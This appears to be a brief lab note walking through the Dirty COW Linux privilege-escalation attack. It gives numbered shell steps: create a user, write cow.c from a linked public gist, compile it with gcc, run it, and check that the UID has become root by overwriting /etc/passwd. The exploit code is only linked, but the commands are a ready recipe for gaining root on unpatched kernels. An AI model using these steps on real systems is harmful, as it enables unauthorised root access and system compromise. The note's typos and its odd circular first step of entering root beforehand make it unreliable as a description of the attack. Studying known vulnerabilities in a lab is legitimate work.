This attack includes over-writing a user's UID in /etc/passwd to gain root privileges.


1)sudo -s //Login into root

2)adduser unikl //Create a new user in the root directory

3)cat /etc/passwd //Check the user that we made

4)su unikl //log in as user 

5)Id // check the uid on unikl

6)nano cow.c //To creat dirtycow exploit file

7)use the github commands : https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679

8)gcc -pthread cow.c -o cow  // To copmile

9)./cow // To run exploit

10)Id  // Checking uid once more reveals that the value of id has been changed to root privilege
